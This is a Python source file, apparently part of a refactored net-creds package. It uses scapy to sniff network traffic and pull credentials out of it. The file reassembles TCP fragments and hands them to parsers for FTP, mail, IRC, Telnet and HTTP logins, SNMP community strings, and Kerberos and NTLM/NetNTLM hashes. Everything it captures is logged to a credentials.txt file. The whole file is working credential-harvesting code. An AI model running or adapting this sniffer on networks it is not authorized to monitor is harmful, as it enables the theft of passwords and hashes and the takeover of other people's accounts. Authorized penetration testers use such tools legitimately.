#!/usr/bin/env python3

import logging

from scapy.layers.inet import UDP, IP, TCP
from scapy.layers.inet6 import IPv6
from scapy.layers.snmp import SNMP

from net_creds.output import printer
from net_creds.protocols.ftp import parse_ftp
from net_creds.protocols.http import parse_http_load
from net_creds.protocols.irc import irc_logins
from net_creds.protocols.kerberos import ParseMSKerbv5TCP, ParseMSKerbv5UDP, Decode_Ip_Packet
from net_creds.protocols.mail import mail_logins
from net_creds.protocols.ntlm import NTLMSSP2_re, NTLMSSP3_re, parse_netntlm, parse_ntlm_chal, parse_ntlm_resp
from net_creds.protocols.snmp import parse_snmp
from net_creds.protocols.telnet import telnet_logins

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.l2 import *

conf.verb = 0
from collections import OrderedDict

logging.basicConfig(filename='../credentials.txt', level=logging.INFO)
pkt_frag_loads = OrderedDict()


def frag_remover():
    '''
    Keep the FILO OrderedDict of frag loads from getting too large
    3 points of limit:
        Number of ip_ports < 50
        Number of acks per ip:port < 25
        Number of chars in load < 5000
    '''
    global pkt_frag_loads

    # Keep the number of IP:port mappings below 50
    # last=False pops the oldest item rather than the latest
    while len(pkt_frag_loads) > 50:
        pkt_frag_loads.popitem(last=False)

    # Loop through a deep copy dict but modify the original dict
    copy_pkt_frag_loads = copy.deepcopy(pkt_frag_loads)
    for ip_port in copy_pkt_frag_loads:
        if len(copy_pkt_frag_loads[ip_port]) > 0:
            # Keep 25 ack:load's per ip:port
            while len(copy_pkt_frag_loads[ip_port]) > 25:
                pkt_frag_loads[ip_port].popitem(last=False)

    # Recopy the new dict to prevent KeyErrors for modifying dict in loop
    copy_pkt_frag_loads = copy.deepcopy(pkt_frag_loads)
    for ip_port in copy_pkt_frag_loads:
        # Keep the load less than 75,000 chars
        for ack in copy_pkt_frag_loads[ip_port]:
            # If load > 5000 chars, just keep the last 200 chars
            if len(copy_pkt_frag_loads[ip_port][ack]) > 5000:
                pkt_frag_loads[ip_port][ack] = pkt_frag_loads[ip_port][ack][-200:]


def frag_joiner(ack, src_ip_port, load):
    '''
    Keep a store of previous fragments in an OrderedDict named pkt_frag_loads
    '''
    for ip_port in pkt_frag_loads:
        if src_ip_port == ip_port:
            if ack in pkt_frag_loads[src_ip_port]:
                # Make pkt_frag_loads[src_ip_port][ack] = full load
                old_load = pkt_frag_loads[src_ip_port][ack]
                concat_load = old_load + load
                return OrderedDict([(ack, concat_load)])

    return OrderedDict([(ack, load)])


def pkt_parser(pkt):
    '''
    Start parsing packets here
    '''
    global pkt_frag_loads

    if pkt.haslayer(Raw):
        try:
            load = pkt[Raw].load.decode("UTF-8")
        except UnicodeDecodeError:
            return

    # Get rid of Ethernet pkts with just a raw load cuz these are usually network controls like flow control
    if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
        return

    # UDP
    if pkt.haslayer(UDP) and pkt.haslayer(IP):

        src_ip_port = str(pkt[IP].src) + ':' + str(pkt[UDP].sport)
        dst_ip_port = str(pkt[IP].dst) + ':' + str(pkt[UDP].dport)

        # SNMP community strings
        if pkt.haslayer(SNMP):
            parse_snmp(src_ip_port, dst_ip_port, pkt[SNMP])
            return

        # Kerberos over UDP
        decoded = Decode_Ip_Packet(str(pkt)[14:])
        kerb_hash = ParseMSKerbv5UDP(decoded['data'][8:])
        if kerb_hash:
            printer(src_ip_port, dst_ip_port, kerb_hash)

    # TCP
    elif pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):

        ack = str(pkt[TCP].ack)
        seq = str(pkt[TCP].seq)
        src_ip_port = str(pkt[IP].src) + ':' + str(pkt[TCP].sport)
        dst_ip_port = str(pkt[IP].dst) + ':' + str(pkt[TCP].dport)
        frag_remover()
        pkt_frag_loads[src_ip_port] = frag_joiner(ack, src_ip_port, load)
        full_load = pkt_frag_loads[src_ip_port][ack]

        # Limit the packets we regex to increase efficiency
        # 750 is a bit arbitrary but some SMTP auth success pkts
        # are 500+ characters
        if 0 < len(full_load) < 750:

            # FTP
            ftp_creds = parse_ftp(full_load, dst_ip_port)
            if len(ftp_creds) > 0:
                for msg in ftp_creds:
                    printer(src_ip_port, dst_ip_port, msg)
                return

            # Mail
            mail_creds_found = mail_logins(full_load, src_ip_port, dst_ip_port, ack, seq)

            # IRC
            irc_creds = irc_logins(full_load, pkt)
            if irc_creds != None:
                printer(src_ip_port, dst_ip_port, irc_creds)
                return

            # Telnet
            telnet_logins(src_ip_port, dst_ip_port, load, ack, seq)

        # HTTP and other protocols that run on TCP + a raw load
        other_parser(src_ip_port, dst_ip_port, full_load, ack, seq, pkt)


def other_parser(src_ip_port, dst_ip_port, full_load, ack, seq, pkt):
    # HTTP
    parse_http_load(full_load, src_ip_port, dst_ip_port)

    # Kerberos over TCP
    decoded = Decode_Ip_Packet(str(pkt)[14:])
    kerb_hash = ParseMSKerbv5TCP(decoded['data'][20:])
    if kerb_hash:
        printer(src_ip_port, dst_ip_port, kerb_hash)

    # Non-NETNTLM NTLM hashes (MSSQL, DCE-RPC,SMBv1/2,LDAP, MSSQL)
    NTLMSSP2 = re.search(NTLMSSP2_re, full_load, re.DOTALL)
    NTLMSSP3 = re.search(NTLMSSP3_re, full_load, re.DOTALL)
    if NTLMSSP2:
        parse_ntlm_chal(NTLMSSP2.group(), ack)
    if NTLMSSP3:
        ntlm_resp_found = parse_ntlm_resp(NTLMSSP3.group(), seq)
        if ntlm_resp_found != None:
            printer(src_ip_port, dst_ip_port, ntlm_resp_found)

    # NetNTLM
    netntlm_found = parse_netntlm(full_load, ack, seq)
    if netntlm_found != None:
        printer(src_ip_port, dst_ip_port, netntlm_found)
